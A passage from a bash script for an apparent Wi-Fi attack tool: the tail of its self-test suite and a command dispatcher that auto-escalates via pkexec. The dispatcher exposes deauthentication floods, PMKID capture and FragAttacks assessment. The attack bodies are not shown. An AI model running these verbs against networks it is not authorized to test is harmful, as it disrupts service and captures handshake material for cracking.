    attack_needs_root --fragattacks        >/dev/null; chk needs-root-fragattacks "$?" "0"
    attack_needs_root --fragattacks-assess >/dev/null; chk needs-root-fragattacks-assess "$?" "1"
    # With no injection-verified adapter the guard must suppress the pkexec
    # prompt, so the assessment output is still produced for a normal user.
    attack_privilege_not_needed --fragattacks; chk no-pkexec-when-gate-fails "$?" "0"
    attack_privilege_not_needed --deauth-flood; chk guard-only-fragattacks "$?" "1"

    # ── argument validation must fire before any hardware is touched ──
    attack_cli_fragattacks "" >/dev/null 2>&1
    chk fa-no-bssid-rc "$?" "2"
    attack_cli_fragattacks not-a-mac >/dev/null 2>&1
    chk fa-bad-bssid-rc "$?" "2"
    attack_cli_fragattacks aa:bb:cc:dd:ee:ff soon >/dev/null 2>&1
    chk fa-bad-duration-rc "$?" "2"
    attack_cli_fragattacks_assess "" >/dev/null 2>&1
    chk fa-assess-no-bssid-rc "$?" "2"

    # ── the full verb, offline: assessment + plan + refusal, never a claim ──
    local fout frc
    fout=$(WIFISTING_FA_FACTS="$st/ap-row.tsv" \
           attack_cli_fragattacks aa:bb:cc:00:00:01 30 2>"$st/fa.err")
    frc=$?
    chk fa-verb-refuses-rc "$frc" "1"
    chk fa-verb-still-assesses \
        "$(printf '%s\n' "$fout" | awk -F'\t' '$1=="CVE" && $2=="24588"{print $3}')" "APPLIES"
    chk fa-verb-emits-plan "$(printf '%s\n' "$fout" | grep -c $'^PLAN\t')" "18"
    chk fa-verb-state-line "$(printf '%s\n' "$fout" | grep -c $'^STATE\tassessed-not-injected$')" "1"
    chk fa-verb-refusal-on-stderr "$(grep -c 'REFUSE' "$st/fa.err")" "1"
    chk fa-verb-never-claims-injection \
        "$(printf '%s\n' "$fout" | grep -c 'INJECT')" "0"
    # The assess-only verb is the offline deliverable and exits 0.
    attack_cli_fragattacks_assess aa:bb:cc:00:00:01 "$st/ap-row.tsv" >/dev/null 2>&1
    chk fa-assess-only-rc "$?" "0"

    rm -rf "$st"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

attack_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift

    if attack_needs_root "$cmd" && \
       [ "$(id -u)" != "0" ] && \
       [ -z "${WIFISTING_ELEVATED:-}" ] && \
       ! attack_privilege_not_needed "$cmd"; then
        exec pkexec "$(readlink -f "$0")" "$cmd" "$@"
    fi

    case "$cmd" in
        --status-tsv)          attack_cli_status_tsv ;;
        --capture-start)       attack_cli_capture_start "$@" ;;
        --capture-stop)        attack_cli_capture_stop ;;
        --deauth-broadcast)    attack_cli_deauth_broadcast "$@" ;;
        --deauth-client)       attack_cli_deauth_client "$@" ;;
        --deauth-flood)        attack_cli_deauth_flood "$@" ;;
        --pmkid)               attack_cli_pmkid "$@" ;;
        --fragattacks)         attack_cli_fragattacks "$@" ;;
        --fragattacks-assess|--fragattacks-assess-tsv)
                               attack_cli_fragattacks_assess "$@" ;;
        --convert)             attack_cli_convert "$@" ;;
        --list-clients-tsv)    attack_cli_list_clients_tsv "$@" ;;
        --clients-enriched-tsv) attack_cli_clients_enriched_tsv "$@" ;;
        --selftest)            attack_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --capture-start PREFIX
  --capture-stop
  --deauth-broadcast [COUNT]
  --deauth-client MAC [COUNT]
  --deauth-flood [SECONDS]
  --pmkid [SECONDS]
  --fragattacks BSSID [SECONDS]
  --fragattacks-assess BSSID [FACTS_FILE]
  --fragattacks-assess-tsv BSSID [FACTS_FILE]
  --convert [CAPFILE]
  --list-clients-tsv [BSSID]
  --selftest
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    attack_cli_main "$@"
fi
